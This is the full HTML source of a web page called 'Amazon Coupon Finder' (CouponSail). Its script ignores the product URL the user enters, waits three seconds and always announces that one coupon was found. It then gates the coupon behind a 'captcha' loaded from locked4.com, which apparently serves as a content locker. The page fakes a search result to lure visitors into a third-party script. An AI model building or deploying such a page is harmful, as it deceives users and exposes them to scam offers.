<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Amazon Coupon Finder</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
<style>
  body, html {
    margin: 0;
    padding: 0;
    font-family: 'Roboto', sans-serif;;
    background-color: #f8f9fa;
    text-align: center;
  }
  .logo {
    margin-top: 100px;
  }
  .search-box {
    margin-top: 20px;
  }
  .search-input {
    width: 60%;
    padding: 15px;
    border: 1px solid #ddd;
    font-size: 16px;
    border-radius: 20px;
    outline: none;
  }
  .button {
    padding: 10px 20px;
    border-radius: 20px;
    border: none;
    background-color: #4caf50; 
    color: white;
    font-size: 16px;
    cursor: pointer;
    margin-top: 10px;
    outline: none;
  }
  .footer {
    margin-top: 30px;
    padding: 10px;
    background-color: #f2f2f2;
    color: #525252;
  }
  #loading, .captcha-loading {
    margin-top: 20px;
  }
  .loader {
    border: 4px solid #f3f3f3;
    border-radius: 50%;
    border-top: 4px solid #4caf50; 
    width: 50px;
    height: 50px;
    animation: spin 2s linear infinite;
    margin: auto; 
  }
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  .coupon-box {
    background-color: #fff;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    width: 60%;
    margin: 20px auto;
  }
  .coupon-message {
    color: #333;
    margin-bottom: 20px;
    font-weight: bold;
  }
  .coupon-separator {
    height: 2px;
    background: linear-gradient(to right, transparent, #4caf50, transparent);
    width: 80%;
    margin: 20px auto;
  }
  .captcha-wrapper {
    display: none;
    margin-top: 10px;
  }
  @media only screen and (max-width: 600px) {
    .search-input {
      width: 80%;
    }
  }
</style>
</head>
<body>

<div class="logo">
  <img src="logo.png" alt="Website Logo" style="max-width: 400px;">
</div>

<div class="search-box">
  <input type="text" class="search-input" placeholder="Enter Amazon product URL">
  <button class="button" onclick="findCoupon()">Find Coupon</button>
</div>

<div id="loading" class="search-box">
  <div class="loader"></div>
</div>

<div id="couponBox" class="coupon-box">
  <!-- Placeholder -->
</div>

<div class="footer">
  Privacy Policy | ToS | Support<br>
  CouponSail, 2024 All rights reserved
</div>

<script>
function findCoupon() {
  const loadingElem = document.getElementById('loading');
  const couponBox = document.getElementById('couponBox');
  loadingElem.style.display = 'block';

  setTimeout(() => {
    loadingElem.style.display = 'none';
    couponBox.innerHTML = `
      <div class="coupon-message">(1) coupon found</div>
      <div class="coupon-separator"></div>
      <div id="captchaWrapper" class="captcha-wrapper">
        <h5>Solve the captcha below to view the Coupon</h5>
        <div data-captcha-enable="true"></div>
      </div>
    `;
    const captchaWrapper = document.getElementById('captchaWrapper');
    captchaWrapper.style.display = "block";
  }, 3000); // Adjust this delay based on the expected load time of the captcha
}

</script>

<!-- Captcha Script -->
<script type="text/javascript" src="https://locked4.com/cp/js/j342y"></script>

</body>
</html>
